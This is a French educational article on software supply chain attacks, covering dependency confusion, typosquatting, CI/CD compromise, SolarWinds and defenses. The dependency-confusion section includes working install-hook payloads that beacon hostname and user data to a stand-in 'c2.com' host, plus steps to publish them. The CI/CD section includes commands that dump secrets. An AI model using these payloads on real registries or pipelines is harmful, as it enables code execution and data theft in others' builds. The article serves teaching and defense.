---
title: Supply Chain Attacks
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [supply-chain, dependency-confusion, typosquatting, solarwinds, ci-cd, sécurité]
date: 2026-03-23
---

# Supply Chain Attacks

Les attaques de supply chain ciblent la chaîne d'approvisionnement logicielle plutôt que la cible finale directement : dépendances tierces, pipelines CI/CD, mises à jour logicielles, ou fournisseurs de services. La compromission d'un maillon de cette chaîne peut affecter des milliers de victimes en aval.

## Anatomie d'une attaque supply chain

```
Chaîne d'approvisionnement logicielle :

  Développeur → Dépendances (npm, PyPI, Maven...)
             → Build system (CI/CD : GitHub Actions, Jenkins...)
             → Artefacts (Docker images, packages...)
             → Infrastructure (fournisseurs SaaS, CDN, outils de monitoring...)
             → Utilisateurs finaux

Vecteurs d'attaque :

  1. Dépendances compromises     → package malveillant dans npm/PyPI/RubyGems
  2. Dependency Confusion        → package interne piraté par un package public
  3. Typosquatting               → package avec un nom très proche du légitime
  4. Build system compromise     → injecter du code dans le pipeline CI/CD
  5. Mise à jour logicielle      → SolarWinds, ASUS Live Update
  6. Preinstalled malware        → hardware ou software avec malware pré-installé
```

## Dependency Confusion

Technique découverte par Alex Birsan en 2021, exploitant la priorité des registres publics sur les privés.

```
Principe :
  Les gestionnaires de packages (npm, pip, etc.) cherchent les packages d'abord
  dans le registre PUBLIC, puis dans le registre privé (dans certaines configs).

  Si une entreprise utilise un package interne nommé "company-utils" :
  → L'attaquant publie un package "company-utils" sur npm/PyPI public
  → Avec un numéro de version PLUS ÉLEVÉ que la version interne
  → Les builds qui ne pinpoint pas leur source correctement installent le package public

Impact réel (2021) :
  Microsoft, Apple, PayPal, Uber, Shopify — tous vulnérables dans leurs pipelines
  → Exécution de code arbitraire dans les environnements de build internes
```

```bash
# Découverte des noms de packages internes
# 1. Fichiers package.json, requirements.txt, pom.xml exposés
#    sur GitHub, GitLab, npm scope @company
# 2. Messages d'erreur révélant des noms de packages manquants
# 3. Profils npm/PyPI de développeurs internes

# Identifier les packages internes non publiés
# Chercher dans package.json public de l'entreprise cible
grep -r '"private"' package.json          # Packages marqués privés
grep -r '@company/' package.json          # Packages avec scope

# Vérifier si le nom est pris sur le registre public
npm view company-internal-package         # Si erreur 404 → nom libre → exploitable
pip index versions company-package        # Pareil pour PyPI

# Publier un package malveillant
# package.json minimal avec postinstall hook
{
  "name": "company-utils",
  "version": "9999.0.0",
  "description": "Internal utilities",
  "scripts": {
    "preinstall": "curl -s http://c2.com/beacon?h=$(hostname)&u=$(whoami)"
  }
}

npm publish --access public

# setup.py malveillant pour PyPI
from setuptools import setup
import subprocess
subprocess.run(['curl', 'http://c2.com/beacon', '-d', f'host={os.uname().nodename}'])
setup(name='company-internal-tool', version='9999.0.0', ...)
```

## Typosquatting

```
Noms de packages populaires piégés par des variantes orthographiques :

npm :
  request        → requiest, requset
  lodash         → 1odash, lodahs
  express        → expresjs, expres
  colors         → colour (variante légitime mais peut confondre)

PyPI :
  django         → diango, djnago
  requests       → request, requestss
  numpy          → nunpy, mumpy
  urllib3        → urlib3, urllib2 (réel mais abandonné)

Exemples réels de packages malveillants détectés :
  crossenv (2017) → cross-env
  event-stream (2018) → hijack d'un package légitime (1M+ téléchargements/semaine)
  ua-parser-js (2021) → hijack, installait un mineur de crypto
  node-ipc (2022) → maintenance payload anti-Russie
```

```bash
# Rechercher des typosquats de packages courants
pip install typosquatting-checker    # Outil de détection

# Vérifier un package avant installation
pip install pip-audit                # Audit des packages installés
pip-audit -r requirements.txt

# npm audit
npm audit
npm install --audit

# Vérifier les métadonnées d'un package suspect
npm view nom-du-package maintainers
npm view nom-du-package homepage
pip show nom-du-package              # Qui l'a publié, quand, depuis où
```

## Compromission de la chaîne CI/CD

```
Vecteurs CI/CD :

  1. Secrets dans le code source
     → Clés API, tokens GitHub, credentials AWS dans les repos
     → Même supprimés du code → toujours dans l'historique git

  2. GitHub Actions / GitLab CI injection
     → Actions de tiers malveillants ou compromis
     → Pull request injection dans les workflows
     → Permissions excessives (GITHUB_TOKEN avec write access)

  3. Pipeline poisoning
     → Injection de code dans un fichier de config CI que le pipeline exécute
     → .github/workflows/*.yml, Jenkinsfile, .gitlab-ci.yml

  4. Artefacts empoisonnés
     → Images Docker de base compromises
     → Packages npm/pip utilisés dans le build
```

```bash
# Recherche de secrets dans les repos GitHub
trufflehog git https://github.com/company/repo --only-verified
gitleaks detect --source .

# Analyser les GitHub Actions pour des vecteurs d'injection
# Rechercher les actions tierces non épinglées
grep -r "uses:" .github/workflows/ | grep -v "@sha"
# → Les actions "owner/repo@v1" sont vulnérables si le tag est réassigné

# Secrets exposés dans les variables d'environnement CI
# Dans un job GitHub Actions compromis
env | sort    # Révèle GITHUB_TOKEN, secrets injectés, etc.
cat /proc/1/environ    # Variables d'environnement du processus init

# GitHub Actions — exfiltration des secrets depuis un PR malveillant
# Un PR peut déclencher un workflow avec accès aux secrets si mal configuré
# (pull_request_target avec checkout du code du PR)
```

## Exemple SolarWinds (2020)

```
Attaque SolarWinds Orion — une des plus sophistiquées documentées :

Chronologie :
  Oct 2019      : attaquants (Cozy Bear / APT29) obtiennent accès au build system
  Mars 2020     : première mise à jour malveillante (SUNBURST) distribuée
  Déc  2020     : découverte par FireEye (après avoir détecté leur propre compromis)

Mécanisme SUNBURST :
  1. Modification du code source d'Orion avant compilation
  2. Build system intégré génère un DLL signé avec le certificat légitime SolarWinds
  3. ~18 000 clients installent la mise à jour légitime mais malveillante
  4. Dormance de 14 jours → exécution → beacon vers avsvmcloud.com
  5. Seulement ~100 cibles activement exploitées (furtivité)

Lessons apprises :
  → Build environment isolé du réseau de production
  → Integrity checks sur les artefacts de build (reproductible builds)
  → Signing des binaires + transparence (SBOM)
  → Détection : monitoring des connexions depuis les serveurs de monitoring eux-mêmes
```

## Défenses et bonnes pratiques

```
Gestion des dépendances :
  ✓ Épingler les versions exactes (pinning) : pas de "^1.2.0", utiliser "1.2.3"
  ✓ Utiliser des lock files (package-lock.json, Pipfile.lock, poetry.lock)
  ✓ Vérifier les checksums/hashes des packages téléchargés
  ✓ Utiliser un registre privé miroir (Artifactory, Nexus) avec contrôle des sources
  ✓ Scanner les dépendances : npm audit, pip-audit, Dependabot, Snyk, OWASP Dependency-Check

Contre la Dependency Confusion :
  ✓ Configurer le gestionnaire pour chercher d'abord le registre privé
  ✓ Enregistrer les noms de packages internes sur les registres publics (squatter le nom)
  ✓ Utiliser des scopes privés (@company/ en npm, index-url forcé en pip)

CI/CD :
  ✓ Secrèts : utiliser un gestionnaire (HashiCorp Vault, AWS Secrets Manager)
  ✓ Ne jamais coder des secrets dans le code source ou les logs
  ✓ GitHub Actions : épingler les actions tierces par SHA de commit (pas par tag)
  ✓ Permissions minimales pour GITHUB_TOKEN (read-only sauf si nécessaire)
  ✓ Build environment isolé, éphémère, et reproductible
  ✓ Code signing : signer les artefacts de build et vérifier avant déploiement

SBOM (Software Bill of Materials) :
  ✓ Générer un SBOM pour chaque build (SPDX, CycloneDX)
  ✓ Scanner le SBOM contre les CVE connues
  ✓ Partager le SBOM avec les clients (transparence)

Monitoring :
  ✓ Surveiller les nouveaux packages publiés avec des noms similaires aux packages internes
  ✓ Alerter sur les modifications inattendues des artefacts de build
  ✓ Auditer les packages installés en production vs lock file
```
